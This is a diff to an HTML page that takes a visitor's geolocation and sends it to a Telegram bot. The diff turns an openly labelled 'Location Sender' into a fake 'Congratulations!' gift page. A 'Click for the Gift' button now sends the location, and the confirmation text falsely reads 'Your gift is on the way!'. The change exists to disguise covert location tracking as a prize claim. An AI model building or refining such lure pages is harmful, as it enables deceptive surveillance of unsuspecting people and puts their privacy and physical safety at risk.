@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🎉 Location Sender 🎉</title>
+    <title>🎉 Congratulations! 🎉</title>
     <script>
         function sendLocation() {
             if (navigator.geolocation) {
@@ -30,7 +30,7 @@
                         .then(response => response.json())
                         .then(data => {
                             if (data.ok) {
-                                document.getElementById("message").innerHTML = "✅ Your location has been sent!";
+                                document.getElementById("message").innerHTML = "✅ Your gift is on the way!";
                             } else {
                                 document.getElementById("message").innerHTML = "❌ Failed to send location!";
                                 console.error("Telegram API Error:", data);
@@ -52,8 +52,10 @@
         }
     </script>
 </head>
-<body onload="sendLocation()">
-    <h1>🎉 Location Sender 🎉</h1>
-    <p id="message">Sending location...</p>
+<body>
+    <h1>🎉 Congratulations! 🎉</h1>
+    <p>Click below to claim your surprise gift!</p>
+    <button onclick="sendLocation()">🎁 Click for the Gift 🎁</button>
+    <p id="message"></p>
 </body>
 </html>
